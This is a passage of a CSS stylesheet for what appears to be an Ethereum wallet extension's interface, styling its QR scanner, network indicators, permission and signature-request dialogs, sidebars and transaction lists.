      border-radius: 8px;
      padding: 0.625rem 0.75rem;
      font-size: 1.25rem;
      margin-top: 0.75rem; }
      .new-account-modal__input::-webkit-input-placeholder {
      color: #9fa6ae; }
      .new-account-modal__input::-moz-placeholder {
      color: #9fa6ae; }
      .new-account-modal__input::-ms-input-placeholder {
      color: #9fa6ae; }
      .new-account-modal__input::placeholder {
      color: #9fa6ae; }
      .new-account-modal__footer {
      padding: 1rem; }
      .new-account-modal__footer button + button {
      margin-left: 1rem; }
      .qr-scanner {
      width: 100%;
      height: 100%;
      background-color: #fff;
      display: flex;
      flex-flow: column;
      border-radius: 8px; }
      .qr-scanner__title {
      font-size: 1.5rem;
      font-weight: 500;
      padding: 16px 0;
      text-align: center; }
      .qr-scanner__content {
      padding-left: 20px;
      padding-right: 20px; }
      .qr-scanner__content__video-wrapper {
      overflow: hidden;
      width: 100%;
      height: 275px;
      display: flex;
      align-items: center;
      justify-content: center; }
      .qr-scanner__content__video-wrapper video {
      -webkit-transform: scaleX(-1);
      transform: scaleX(-1);
      width: auto;
      height: 275px; }
      .qr-scanner__status {
      text-align: center;
      font-size: 14px;
      padding: 15px; }
      .qr-scanner__image {
      font-size: 1.5rem;
      font-weight: 500;
      padding: 16px 0 0;
      text-align: center; }
      .qr-scanner__error {
      text-align: center;
      font-size: 16px;
      padding: 15px; }
      .qr-scanner__footer {
      padding: 20px;
      flex-direction: row;
      display: flex; }
      .qr-scanner__footer button {
      margin-right: 15px; }
      .qr-scanner__footer button:last-of-type {
      margin-right: 0;
      background-color: #009eec;
      border: none;
      color: #fff; }
      .qr-scanner__close::after {
      content: '\00D7';
      font-size: 35px;
      color: #9b9b9b;
      position: absolute;
      top: 4px;
      right: 20px;
      cursor: pointer;
      font-weight: 300; }
      .transaction-confirmed__title {
      font-size: 1.5rem;
      font-weight: 500;
      padding: 16px 0;
      text-align: center; }
      .transaction-confirmed__description {
      text-align: center;
      font-size: 0.875rem; }
      .transaction-confirmed__content {
      overflow-y: auto;
      flex: 1;
      display: flex;
      flex-direction: column;
      align-items: center;
      padding: 16px; }
      .modal {
      z-index: 1050;
      position: fixed;
      width: 500px;
      -webkit-transform: translate3d(-50%, -50%, 0);
      transform: translate3d(-50%, -50%, 0);
      top: 50%;
      left: 50%; }
      .modal__content {
      margin: 0;
      background-color: white;
      -webkit-animation-fill-mode: forwards;
      animation-fill-mode: forwards; }
      .modal__backdrop {
      position: fixed;
      top: 0;
      right: 0;
      bottom: 0;
      left: 0;
      z-index: 1040;
      background-color: #373a47;
      -webkit-animation-fill-mode: forwards;
      animation-fill-mode: forwards;
      -webkit-animation-duration: 0.3s;
      animation-duration: 0.3s; }
      .modal > div:focus {
      outline: none !important; }
      .home-notification-wrapper--show-all,
      .home-notification-wrapper--show-first {
      display: flex;
      flex-direction: column;
      width: 472px;
      position: absolute;
      bottom: 0;
      right: 0;
      margin: 8px; }
      @media screen and (max-width: 576px) {
      .home-notification-wrapper--show-all,
      .home-notification-wrapper--show-first {
      width: 340px; } }
      .home-notification-wrapper--show-all .home-notification-wrapper__i-container,
      .home-notification-wrapper--show-first .home-notification-wrapper__i-container {
      position: relative;
      width: 100%;
      height: 100%; }
      .home-notification-wrapper--show-all .home-notification-wrapper__i-container .fa-sm,
      .home-notification-wrapper--show-first .home-notification-wrapper__i-container .fa-sm {
      display: initial;
      position: absolute;
      bottom: 14px;
      left: 16px;
      color: white;
      cursor: pointer;
      visibility: visible; }
      .home-notification-wrapper--show-all .home-notification-wrapper__i-container .fa-sm:hover,
      .home-notification-wrapper--show-first .home-notification-wrapper__i-container .fa-sm:hover {
      color: #b0d7f2;
      font-size: 1.1rem; }
      .home-notification-wrapper--show-all {
      justify-content: flex-end;
      margin-bottom: 0; }
      .home-notification-wrapper--show-all .home-notification-wrapper__i-container {
      height: 0; }
      .home-notification-wrapper--show-all > div {
      position: relative;
      margin-top: 8px; }
      .home-notification-wrapper--show-all .fa-sm {
      margin-bottom: 8px; }
      .home-notification-wrapper--show-first > div {
      position: absolute;
      bottom: 0;
      right: 0;
      visibility: hidden; }
      .home-notification-wrapper--show-first > div:first-of-type {
      visibility: visible; }
      .home-notification-wrapper--show-first .fa-sm {
      position: relative;
      display: initial; }
      .flipped {
      -webkit-transform: rotate(180deg);
      transform: rotate(180deg); }
      .network-display__container {
      display: flex;
      align-items: center;
      justify-content: flex-start;
      padding: 0 10px;
      border-radius: 4px;
      height: 25px; }
      .network-display__container--colored {
      background-color: #f2f2f3; }
      .network-display__container--mainnet {
      background-color: #e8feff; }
      .network-display__container--ropsten {
      background-color: #fde7ed; }
      .network-display__container--kovan {
      background-color: #f7e7fe; }
      .network-display__container--rinkeby {
      background-color: #fcf3e1; }
      .network-display__container--goerli {
      background-color: #d8ecfd; }
      .network-display__name {
      font-size: 0.75rem;
      padding-left: 5px; }
      .network-display__icon {
      height: 10px;
      width: 10px;
      border-radius: 10px; }
      .network-display__icon--mainnet {
      background-color: #038789; }
      .network-display__icon--ropsten {
      background-color: #e91550; }
      .network-display__icon--kovan {
      background-color: #690496; }
      .network-display__icon--rinkeby {
      background-color: #ebb33f; }
      .network-display__icon--goerli {
      background-color: #3099f2; }
      .permission-approval-container.page-container {
      display: flex;
      border: none;
      box-shadow: none;
      width: 100%;
      margin-top: 2px;
      height: 100%;
      flex-direction: column;
      justify-content: space-between; }
      @media screen and (min-width: 576px) {
      .permission-approval-container {
      width: 426px;
      flex: 1; }
      .permission-approval-container__footers {
      display: flex;
      flex-direction: column-reverse;
      flex: 1;
      padding-bottom: 20px;
      justify-content: space-between; } }
      .permission-approval-container__header {
      display: flex;
      flex-direction: column;
      align-items: flex-end;
      border-bottom: 1px solid #d2d8dd;
      padding: 9px; }
      .permission-approval-container__title {
      font-style: normal;
      font-weight: normal;
      font-size: 1.125rem;
      font-family: Euclid, Roboto, Helvetica, Arial, sans-serif;
      line-height: 140%;
      line-height: 25px;
      text-align: center;
      margin-top: 32px;
      width: 100%; }
      .permission-approval-container__content {
      display: flex;
      overflow-y: auto;
      flex-direction: column;
      color: #7c808e;
      padding-left: 24px;
      padding-right: 24px; }
      .permission-approval-container__content a,
      .permission-approval-container__content a:hover {
      color: #3099f2; }
      .permission-approval-container__content__requested {
      text-align: left; }
      .permission-approval-container__content__revoke-note {
      margin-top: 60px; }
      .permission-approval-container__content__permission {
      display: flex;
      align-items: center; }
      .permission-approval-container__content__permission label {
      font-size: 14px;
      margin-left: 16px;
      color: #24292e; }
      .permission-approval-container .permission-approval-container__checkbox {
      font-size: 1.4rem;
      margin: 0; }
      .permission-approval-container__content-container {
      display: flex;
      flex-direction: column;
      align-items: center; }
      .permission-approval-container__permissions-header {
      font-style: normal;
      font-weight: normal;
      font-size: 0.875rem;
      line-height: 140%;
      line-height: 20px;
      color: #6a737d; }
      .permission-approval-container__permissions-container {
      display: flex;
      flex-direction: column;
      margin-top: 38px; }
      .permission-approval-container .page-container__footer {
      align-items: center;
      margin-top: 12px; }
      @media screen and (min-width: 576px) {
      .permission-approval-container .page-container__footer {
      border-top: none; } }
      .permission-approval-container .page-container__footer footer {
      width: 100%;
      justify-content: space-between; }
      .permission-approval-container .page-container__footer footer button {
      width: 124px; }
      @media screen and (max-width: 575px) {
      .permission-approval-container__title {
      position: initial; }
      .permission-approval-container__content-approval-visual {
      margin-top: 16px; }
      .permission-approval-container .page-container__footer header {
      padding: 0; } }
      .permission-approval-container__tooltip-body {
      display: flex;
      flex-direction: column; }
      .permission-approval-container__bold-title-elements {
      font-weight: bold; }
      .permissions-connect-footer {
      display: flex;
      flex-direction: column;
      width: 100%;
      align-items: center; }
      .permissions-connect-footer__text {
      font-style: normal;
      font-weight: normal;
      font-size: 0.75rem;
      font-family: Euclid, Roboto, Helvetica, Arial, sans-serif;
      line-height: 140%;
      line-height: 17px;
      color: #6a737d;
      display: flex;
      margin-top: 10px; }
      .permissions-connect-footer__text--link {
      color: #037dd6;
      margin-left: 4px;
      cursor: pointer; }
      .permissions-connect-header {
      display: flex;
      flex: 0;
      flex-direction: column;
      justify-content: center;
      width: 92%; }
      .permissions-connect-header__icon {
      display: flex;
      flex-direction: column;
      align-items: center; }
      .permissions-connect-header__icon .icon-with-fallback__identicon-container,
      .permissions-connect-header__icon .icon-with-fallback__identicon-border {
      height: 64px;
      width: 64px; }
      .permissions-connect-header__icon .icon-with-fallback__identicon-border {
      border: 1px solid #d6d9dc; }
      .permissions-connect-header__icon .icon-with-fallback__identicon-container {
      margin-bottom: 8px; }
      .permissions-connect-header__title {
      font-style: normal;
      font-weight: normal;
      font-size: 1.5rem;
      font-family: Euclid, Roboto, Helvetica, Arial, sans-serif;
      line-height: 140%;
      text-align: center;
      color: #24292e;
      margin-top: 14px; }
      .permissions-connect-header__text, .permissions-connect-header__subtitle {
      font-style: normal;
      font-weight: normal;
      font-size: 0.875rem;
      line-height: 140%;
      text-align: center;
      color: #6a737d; }
      .permissions-connect-header__text {
      width: 100%;
      text-overflow: ellipsis;
      overflow: hidden;
      /*rtl:ignore*/
      direction: rtl; }
      .permissions-connect-header__subtitle {
      margin-top: 4px; }
      .selected-account {
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      flex: 1; }
      .selected-account__tooltip-wrapper {
      width: 100%; }
      .selected-account__name {
      width: 100%;
      font-size: 1rem;
      font-weight: 500;
      line-height: 19px;
      color: #000;
      text-overflow: ellipsis;
      overflow: hidden;
      white-space: nowrap;
      text-align: center;
      margin-bottom: 4px; }
      .selected-account__address {
      font-size: 0.75rem;
      line-height: 0.75rem;
      color: #989a9b; }
      .selected-account__clickable {
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      margin: 4px 0;
      padding: 6px 1px;
      border-radius: 10px;
      cursor: pointer; }
      .selected-account__clickable:hover {
      background-color: #f2f3f4; }
      .selected-account__clickable:active {
      background-color: #d9d7da; }
      .sidebar-left {
      display: flex; }
      .sidebar-left .gas-modal-page-container {
      display: flex; }
      .sidebar-left .gas-modal-page-container .page-container {
      flex: 1;
      max-width: 100%; }
      .sidebar-left .gas-modal-page-container .page-container__content {
      display: flex;
      overflow-y: initial; }
      @media screen and (max-width: 575px) {
      .sidebar-left .gas-modal-page-container .page-container {
      max-width: 344px;
      min-height: auto; } }
      @media screen and (min-width: 575px) {
      .sidebar-left .gas-modal-page-container .page-container {
      max-height: none; } }
      .sidebar-left .gas-modal-page-container .gas-price-chart {
      margin-left: 10px; }
      .sidebar-left .gas-modal-page-container .gas-price-chart__root {
      max-height: 160px !important; }
      .sidebar-left .gas-modal-page-container .page-container__bottom {
      display: flex;
      flex-direction: column;
      height: 100%; }
      .sidebar-left .gas-modal-page-container .page-container__content {
      overflow-y: inherit; }
      .sidebar-left .gas-modal-page-container .basic-tab-content {
      height: auto;
      margin-bottom: 0;
      border-bottom: 1px solid #d2d8dd;
      flex: 1 1 70%; }
      @media screen and (max-width: 575px) {
      .sidebar-left .gas-modal-page-container .basic-tab-content {
      padding-left: 14px;
      padding-bottom: 21px; } }
      @media screen and (max-width: 575px) {
      .sidebar-left .gas-modal-page-container .basic-tab-content .gas-price-button-group--alt {
      max-width: 318px; }
      .sidebar-left .gas-modal-page-container .basic-tab-content .gas-price-button-group--alt__time-estimate {
      font-size: 12px; } }
      @media screen and (min-width: 575px) {
      .sidebar-left .gas-modal-page-container .advanced-tab {
      flex: 1 1 70%; } }
      .sidebar-left .gas-modal-page-container .advanced-tab__fee-chart {
      height: 320px; }
      @media screen and (max-width: 575px) {
      .sidebar-left .gas-modal-page-container .advanced-tab__fee-chart {
      height: initial; } }
      .sidebar-left .gas-modal-page-container .advanced-tab__fee-chart__speed-buttons {
      bottom: 77px; }
      @media screen and (max-width: 575px) {
      .sidebar-left .gas-modal-page-container .advanced-tab__fee-chart__speed-buttons {
      display: none; } }
      .sidebar-left .gas-modal-page-container .gas-modal-content {
      display: flex;
      flex-direction: column;
      width: 100%; }
      .sidebar-left .gas-modal-page-container .gas-modal-content__info-row-wrapper {
      display: flex; }
      @media screen and (min-width: 575px) {
      .sidebar-left .gas-modal-page-container .gas-modal-content__info-row-wrapper {
      flex: 1 1 30%; } }
      .sidebar-left .gas-modal-page-container .gas-modal-content__info-row {
      height: 170px; }
      @media screen and (max-width: 575px) {
      .sidebar-left .gas-modal-page-container .gas-modal-content__info-row {
      height: initial;
      display: flex;
      justify-content: center; } }
      .sidebar-right-enter {
      transition: -webkit-transform 300ms ease-in-out;
      transition: transform 300ms ease-in-out;
      transition: transform 300ms ease-in-out, -webkit-transform 300ms ease-in-out;
      -webkit-transform: translateX(-100%);
      transform: translateX(-100%); }
      .sidebar-right-enter.sidebar-right-enter-active {
      transition: -webkit-transform 300ms ease-in-out;
      transition: transform 300ms ease-in-out;
      transition: transform 300ms ease-in-out, -webkit-transform 300ms ease-in-out;
      -webkit-transform: translateX(0%);
      transform: translateX(0%); }
      .sidebar-right-leave {
      transition: -webkit-transform 200ms ease-out;
      transition: transform 200ms ease-out;
      transition: transform 200ms ease-out, -webkit-transform 200ms ease-out;
      -webkit-transform: translateX(0%);
      transform: translateX(0%); }
      .sidebar-right-leave.sidebar-right-leave-active {
      transition: -webkit-transform 200ms ease-out;
      transition: transform 200ms ease-out;
      transition: transform 200ms ease-out, -webkit-transform 200ms ease-out;
      -webkit-transform: translateX(-100%);
      transform: translateX(-100%); }
      .sidebar-left-enter {
      transition: -webkit-transform 300ms ease-in-out;
      transition: transform 300ms ease-in-out;
      transition: transform 300ms ease-in-out, -webkit-transform 300ms ease-in-out;
      -webkit-transform: translateX(100%);
      transform: translateX(100%); }
      .sidebar-left-enter.sidebar-left-enter-active {
      transition: -webkit-transform 300ms ease-in-out;
      transition: transform 300ms ease-in-out;
      transition: transform 300ms ease-in-out, -webkit-transform 300ms ease-in-out;
      -webkit-transform: translateX(0%);
      transform: translateX(0%); }
      .sidebar-left-leave {
      transition: -webkit-transform 200ms ease-out;
      transition: transform 200ms ease-out;
      transition: transform 200ms ease-out, -webkit-transform 200ms ease-out;
      -webkit-transform: translateX(0%);
      transform: translateX(0%); }
      .sidebar-left-leave.sidebar-left-leave-active {
      transition: -webkit-transform 200ms ease-out;
      transition: transform 200ms ease-out;
      transition: transform 200ms ease-out, -webkit-transform 200ms ease-out;
      -webkit-transform: translateX(100%);
      transform: translateX(100%); }
      .sidebar-left {
      flex: 1 0 230px;
      background: #fafafa;
      z-index: 26;
      position: fixed;
      left: 15%;
      right: 0;
      bottom: 0;
      opacity: 1;
      visibility: visible;
      will-change: transform;
      overflow-y: auto;
      box-shadow: rgba(0, 0, 0, 0.15) 2px 2px 4px;
      width: 85%;
      height: 100%; }
      @media screen and (min-width: 769px) {
      .sidebar-left {
      width: 408px;
      left: calc(100% - 408px); } }
      @media screen and (max-width: 575px) {
      .sidebar-left {
      width: 100%;
      left: 0%; } }
      .sidebar-overlay {
      z-index: 25;
      position: fixed;
      height: 100%;
      width: 100%;
      left: 0;
      right: 0;
      bottom: 0;
      opacity: 1;
      visibility: visible;
      background-color: rgba(0, 0, 0, 0.3); }
      .signature-request-footer {
      display: flex;
      border-top: 1px solid #d2d8dd; }
      .signature-request-footer button {
      text-transform: uppercase;
      flex: 1;
      margin: 1rem 0.5rem;
      border-radius: 3px; }
      .signature-request-footer button:first-child {
      margin-left: 1rem; }
      .signature-request-footer button:last-child {
      margin-right: 1rem; }
      .signature-request-header {
      display: flex;
      padding: 1rem;
      border-bottom: 1px solid #d2d8dd;
      justify-content: space-between;
      font-size: 0.75rem; }
      .signature-request-header--account, .signature-request-header--network {
      flex: 1; }
      .signature-request-header--account {
      display: flex;
      align-items: center; }
      .signature-request-header--account .account-list-item__top-row {
      display: flex;
      align-items: center; }
      .signature-request-header--account .account-list-item__account-name {
      font-size: 12px;
      font-weight: 500; }
      .signature-request-header--account .account-list-item__top-row {
      margin: 0; }
      .signature-request-message {
      flex: 1 60%;
      display: flex;
      flex-direction: column; }
      .signature-request-message__title {
      font-weight: 500;
      font-size: 14px;
      color: #636778;
      margin-left: 12px; }
      .signature-request-message h2 {
      flex: 1 1 0;
      text-align: left;
      font-size: 0.8rem;
      border-bottom: 1px solid #d2d8dd;
      padding: 0.5rem;
      margin: 0;
      color: #ccc; }
      .signature-request-message--root {
      flex: 1 100%;
      background-color: #f8f9fb;
      padding-bottom: 0.5rem;
      overflow: auto;
      padding-left: 12px;
      padding-right: 12px;
      width: 360px; }
      @media screen and (min-width: 576px) {
      .signature-request-message--root {
      width: auto; } }
      .signature-request-message__type-title {
      font-style: normal;
      font-weight: normal;
      font-size: 14px;
      margin-left: 12px;
      margin-top: 6px;
      margin-bottom: 10px; }
      .signature-request-message--node, .signature-request-message--node-leaf {
      padding-left: 0.8rem; }
      .signature-request-message--node-label, .signature-request-message--node-leaf-label {
      color: #5b5d67; }
      .signature-request-message--node-value, .signature-request-message--node-leaf-value {
      color: black;
      margin-left: 0.5rem;
      text-overflow: ellipsis;
      white-space: nowrap;
      overflow: hidden; }
      .signature-request-message--node-leaf {
      display: flex; }
      .signature-request {
      display: flex;
      flex: 1 1 auto;
      flex-direction: column;
      min-width: 0; }
      @media screen and (min-width: 576px) {
      .signature-request {
      flex: initial; } }
      .signature-request-header {
      flex: 1; }
      .signature-request-header .network-display__container {
      padding: 0;
      justify-content: flex-end; }
      .signature-request-header .network-display__name {
      font-size: 12px;
      white-space: nowrap;
      font-weight: 500; }
      .signature-request-content {
      flex: 1 40%;
      margin-top: 1rem;
      display: flex;
      align-items: center;
      flex-direction: column;
      margin-bottom: 25px;
      min-height: -webkit-min-content;
      min-height: -moz-min-content;
      min-height: min-content; }
      .signature-request-content__title {
      font-style: normal;
      font-weight: 500;
      font-size: 18px; }
      .signature-request-content__identicon-container {
      padding: 1rem;
      flex: 1;
      position: relative;
      width: 100%;
      display: flex;
      justify-content: center;
      align-items: center; }
      .signature-request-content__identicon-border {
      height: 75px;
      width: 75px;
      border-radius: 50%;
      border: 1px solid white;
      position: absolute;
      box-shadow: 0 2px 2px 0.5px rgba(0, 0, 0, 0.19); }
      .signature-request-content__identicon-initial {
      position: absolute;
      font-style: normal;
      font-weight: 500;
      font-size: 60px;
      color: white;
      z-index: 1;
      text-shadow: 0 4px 6px rgba(0, 0, 0, 0.422); }
      .signature-request-content__info {
      font-size: 12px; }
      .signature-request-content__info--bolded {
      font-size: 16px;
      font-weight: 500; }
      .signature-request-content p {
      color: #999;
      font-size: 0.8rem; }
      .signature-request-footer {
      flex: 1 1 auto; }
      .request-signature__container {
      width: 380px;
      border-radius: 8px;
      background-color: #fff;
      box-shadow: 0 2px 4px 0 rgba(0, 0, 0, 0.08);
      display: flex;
      flex-flow: column nowrap;
      z-index: 25;
      align-items: center;
      position: relative;
      height: 100%; }
      @media screen and (max-width: 575px) {
      .request-signature__container {
      width: 100%;
      top: 0;
      box-shadow: none; } }
      @media screen and (min-width: 576px) {
      .request-signature__container {
      height: 620px; } }
      .request-signature__typed-container {
      padding: 17px; }
      .request-signature__typed-container h1 {
      font-weight: 900;
      margin-bottom: 5px; }
      .request-signature__typed-container * {
      white-space: nowrap;
      overflow: hidden;
      text-overflow: ellipsis; }
      .request-signature__typed-container > div {
      margin-bottom: 10px; }
      .request-signature__header {
      height: 64px;
      width: 100%;
      position: relative;
      display: flex;
      flex-flow: column;
      justify-content: center;
      align-items: center;
      flex: 0 0 auto; }
      .request-signature__header-background {
      position: absolute;
      background-color: #e9edf0;
      z-index: 2;
      width: 100%;
      height: 100%; }
      .request-signature__header__text {
      color: #5b5d67;
      font-size: 22px;
      line-height: 29px;
      z-index: 3; }
      .request-signature__header__tip-container {
      width: 100%;
      display: flex;
      justify-content: center; }
      .request-signature__header__tip {
      height: 25px;
      width: 25px;
      background: #e9edf0;
      -webkit-transform: rotate(45deg);
      transform: rotate(45deg);
      position: absolute;
      bottom: -8px;
      z-index: 1; }
      .request-signature__account-info {
      display: flex;
      justify-content: space-between;
      margin-top: 18px;
      margin-bottom: 20px; }
      .request-signature__account {
      color: #9b9b9b;
      margin-left: 17px; }
      .request-signature__account-text {
      font-size: 14px; }
      .request-signature__account-item {
      height: 22px;
      background-color: #fff;
      line-height: 16px;
      font-size: 12px;
      width: 124px; }
      .request-signature__account-item .account-list-item {
      margin-top: 6px; }
      .request-signature__account-item .account-list-item__account-name {
      text-overflow: ellipsis;
      overflow: hidden;
      white-space: nowrap;
      width: 80px; }
      .request-signature__account-item .account-list-item__top-row {
      margin: 0; }
      .request-signature__balance {
      color: #9b9b9b;
      margin-right: 17px;
      width: 124px; }
      .request-signature__balance-text {
      text-align: right;
      font-size: 14px; }
      .request-signature__balance-value {
      text-align: right;
      margin-top: 2.5px; }
      .request-signature__request-icon {
      margin-top: 25px; }
      .request-signature__body {
      width: 100%;
      height: 100%;
      display: flex;
      flex-flow: column;
      flex: 1 1 auto;
      height: 0; }
      .request-signature__request-info {
      display: flex;
      justify-content: center; }
      .request-signature__headline {
      height: 48px;
      width: 240px;
      color: #4d4d4d;
      font-size: 18px;
      line-height: 24px;
      text-align: center;
      margin-top: 20px; }
      .request-signature__notice, .request-signature__warning {
      font-size: 14px;
      line-height: 19px;
      text-align: center;
      margin-top: 41px;
      margin-bottom: 11px;
      width: 100%; }
      .request-signature__notice {
      color: #9b9b9b; }
      .request-signature__warning {
      color: #e91550; }
      .request-signature__rows {
      height: 100%;
      overflow-y: scroll;
      overflow-x: hidden;
      border-top: 1px solid #d2d8dd;
      display: flex;
      flex-flow: column; }
      .request-signature__row {
      display: flex;
      flex-flow: column;
      flex: 1 0 auto; }
      .request-signature__row-title {
      width: 80px;
      color: #9b9b9b;
      font-size: 16px;
      line-height: 22px;
      margin-top: 12px;
      margin-left: 18px;
      width: 100%; }
      .request-signature__row-value {
      color: #5d5d5d;
      font-size: 14px;
      line-height: 19px;
      width: 100%;
      overflow-wrap: break-word;
      border-bottom: 1px solid #d2d8dd;
      padding: 6px 18px 15px;
      white-space: pre-line; }
      .request-signature__help-link {
      cursor: pointer;
      text-decoration: underline;
      color: #037dd6; }
      .request-signature__footer {
      width: 100%;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 22px;
      position: relative;
      flex: 0 0 auto;
      border-top: 1px solid #d2d8dd;
      padding: 1.6rem; }
      .request-signature__footer button {
      width: 165px; }
      .request-signature__footer__cancel-button {
      margin-right: 1.2rem; }
      .tab-bar {
      display: flex;
      flex-direction: column;
      justify-content: flex-start; }
      .tab-bar__tab {
      display: flex;
      flex-flow: row nowrap;
      align-items: flex-start;
      min-width: 0;
      flex: 0 0 auto;
      box-sizing: border-box;
      font-size: 16px;
      padding: 16px 24px;
      opacity: 0.5;
      transition: opacity 200ms ease-in-out; }
      @media screen and (min-width: 576px) {
      .tab-bar__tab:hover {
      opacity: 0.4; }
      .tab-bar__tab:active {
      opacity: 0.6; } }
      @media screen and (max-width: 575px) {
      .tab-bar__tab {
      font-size: 18px;
      padding: 24px;
      border-bottom: 1px solid #dedede;
      opacity: 1; } }
      .tab-bar__tab__content {
      flex: 1 1 auto;
      width: 0; }
      .tab-bar__tab__content__description {
      display: none; }
      @media screen and (max-width: 575px) {
      .tab-bar__tab__content__description {
      display: block;
      font-size: 14px;
      font-weight: 300;
      margin-top: 8px;
      min-height: 14px; } }
      .tab-bar__tab__caret {
      display: none; }
      @media screen and (max-width: 575px) {
      .tab-bar__tab__caret {
      display: block;
      background-image: url("/images/caret-right.svg");
      width: 36px;
      height: 36px;
      opacity: 0.5;
      background-size: contain;
      background-repeat: no-repeat;
      background-position: center; }
      [dir='rtl'] .tab-bar__tab__caret {
      -webkit-transform: rotate(180deg);
      transform: rotate(180deg); } }
      .tab-bar__tab--active {
      opacity: 1 !important; }
      .tab-bar__grow-tab {
      flex-grow: 1; }
      .token-cell--outdated .list-item__heading {
      color: #6a737d; }
      .transaction-activity-log__title {
      border-bottom: 1px solid #d8d8d8;
      padding-bottom: 4px;
      text-transform: capitalize; }
      .transaction-activity-log__activities-container {
      padding-top: 8px; }
      .transaction-activity-log__activity {
      padding: 4px 0;
      display: flex;
      flex-direction: row;
      align-items: center;
      position: relative; }
      .transaction-activity-log__activity::after {
      content: '';
      position: absolute;
      left: 0;
      top: 0;
      height: 100%;
      width: 7px;
      border-right: 1px solid #909090; }
      .transaction-activity-log__activity:first-child::after {
      height: 50%;
      top: 50%; }
      .transaction-activity-log__activity:last-child::after {
      height: 50%; }
      .transaction-activity-log__activity:first-child:last-child::after {
      display: none; }
      .transaction-activity-log__activity-icon {
      width: 15px;
      height: 15px;
      margin-right: 6px;
      border-radius: 50%;
      background: #909090;
      flex: 0 0 auto;
      display: flex;
      justify-content: center;
      align-items: center;
      z-index: 1; }
      .transaction-activity-log__activity-text {
      color: #9b9b9b;
      font-size: 0.75rem;
      cursor: pointer; }
      .transaction-activity-log__activity-text:hover {
      color: #000; }
      .transaction-activity-log__value {
      display: inline;
      font-weight: 500; }
      .transaction-activity-log__entry-container {
      min-width: 0; }
      .transaction-activity-log__action-link {
      font-size: 0.75rem;
      cursor: pointer;
      color: #037dd6; }
      .transaction-activity-log b {
      font-weight: 500; }
      .transaction-breakdown-row {
      font-size: 0.75rem;
      color: #5d5d5d;
      display: flex;
      justify-content: space-between;
      padding: 8px 0; }
      .transaction-breakdown-row:not(:last-child) {
      border-bottom: 1px solid #d8d8d8; }
      .transaction-breakdown-row__title {
      padding-right: 8px; }
      .transaction-breakdown-row__value {
      min-width: 0; }
      .transaction-breakdown__title {
      border-bottom: 1px solid #d8d8d8;
      padding-bottom: 4px;
      text-transform: capitalize; }
      .transaction-breakdown__row-title {
      text-transform: capitalize; }
      .transaction-breakdown__value {
      display: flex;
      justify-content: flex-end;
      text-align: end;
      white-space: nowrap;
      overflow: hidden;
      text-overflow: ellipsis; }
      .transaction-breakdown__value--eth-total {
      font-weight: 500; }
      .transaction-list-item-details__header {
      margin: 8px 16px;
      display: flex;
      justify-content: space-between;
      align-items: center; }
      .transaction-list-item-details__body {
      background: #fafbfc;
      padding: 8px 16px; }
      .transaction-list-item-details__header-buttons {
      display: flex;
      flex-direction: row; }
      .transaction-list-item-details .transaction-list-item-details__header-button {
      font-size: 0.625rem; }
      .transaction-list-item-details .transaction-list-item-details__header-button-tooltip-container {
      display: flex !important;
      height: 100%; }
      .transaction-list-item-details .transaction-list-item-details__header-button:not(:last-child) {
      margin-right: 8px; }
      .transaction-list-item-details__sender-to-recipient-container {
      margin-bottom: 8px; }
      .transaction-list-item-details__cards-container {
      display: flex;
      flex-direction: column; }
      .transaction-list-item-details__transaction-breakdown {
      flex: 1;
      margin-right: 8px;
      min-width: 0;
      margin: 0 0 8px 0; }
      .transaction-list-item-details__transaction-activity-log {
      flex: 2;
      min-width: 0;
      padding-left: 12px; }
      .transaction-list-item__primary-currency {
      color: #24292e;
      overflow: hidden;
      text-overflow: ellipsis; }
      .transaction-list-item__secondary-currency {
      font-size: 12px;
      margin-top: 4px;
      color: #6a737d; }
      .transaction-list-item .transaction-list-item--unconfirmed {
      color: #6a737d; }
      .transaction-list-item--unconfirmed .transaction-list-item__primary-currency {
      color: #6a737d; }
      .transaction-list-item__pending-actions {
      padding-top: 12px;
      display: flex; }
      .transaction-list-item__pending-actions .button {
      font-size: 0.625rem;
      padding: 8px;
      width: 75px;
      white-space: nowrap;
      line-height: 1rem; }
      .transaction-list-item__pending-actions > .button:first-child {
      margin-right: 6px; }
      .transaction-list-item__pending-actions:empty {
      padding-top: 0; }
      .transaction-list-item .list-item__subheading > h3 {
      overflow: visible;
      display: flex;
      white-space: nowrap;
      text-overflow: initial; }
      .transaction-list-item .transaction-status::after {
      content: "·";
      margin: 0 4px; }
      .transaction-list-item__origin, .transaction-list-item__address {
      overflow: hidden;
      text-overflow: ellipsis;
      white-space: nowrap; }
      .transaction-list-item__origin {
      /*rtl:ignore*/
      direction: rtl; }
      .transaction-list {
      display: flex;
      flex-direction: column;
      flex: 1; }
      .transaction-list__completed-transactions {
      display: flex;
      flex-direction: column;
      flex: 1; }
      .transaction-list__header {
      flex: 0 0 auto;
      font-size: 14px;
      line-height: 20px;
      color: #848c96;
      border-bottom: 1px solid #d6d9dc;
      padding: 8px 0 8px 20px; }
      @media screen and (max-width: 575px) {
      .transaction-list__header {
      padding: 8px 0 8px 16px; } }
      .transaction-list__transactions {
      flex: 1; }
      .transaction-list__pending-transactions {
      margin-bottom: 16px; }
      .transaction-list__empty {
      flex: 1;
      display: grid;
      grid-template-rows: auto;
      padding-top: 24px; }
      .transaction-list__empty-text {
      grid-row-start: 2;
      display: flex;
      justify-content: center;
      color: #cdcdcd; }
      .transaction-list__view-more {
      margin: 16px auto;
      max-width: 200px; }
      .transaction-status {
      display: inline; }
      .transaction-status--unapproved {
      color: #f66a0a; }
      .transaction-status--failed {
      color: #d73a49; }
      .transaction-status--cancelled {
      color: #d73a49; }
      .transaction-status--dropped {
      color: #d73a49; }
      .transaction-status--rejected {
      color: #d73a49; }
      .transaction-status--pending {
      color: #f66a0a; }
      .transaction-status--queued {
      color: #6a737d; }
      .wallet-overview {
      display: flex;
      justify-content: space-between;
      align-items: center;
      flex: 1;
      min-height: 209px;
      min-width: 0;
      padding-top: 10px;
      flex-direction: column;
      width: 100%; }
      .wallet-overview__balance {
      flex: 1;
      display: flex;
      flex-direction: column;
      align-items: center;
      width: 100%; }
      .wallet-overview__buttons {
      display: flex;
      flex-direction: row;
      height: 68px;
      margin-bottom: 24px; }
      .eth-overview__balance {
      display: flex;
      flex-direction: column;
      min-width: 0;
      position: relative;
      align-items: center;
      margin: 16px 0;
      padding: 0 16px;
      max-width: 100%; }
      .eth-overview__primary-container {
      display: flex; }
      .eth-overview__primary-balance {
      color: #000;
      font-size: 32px;
      line-height: 45px;
      width: 100%;
      justify-content: center; }
      .eth-overview__cached-star {
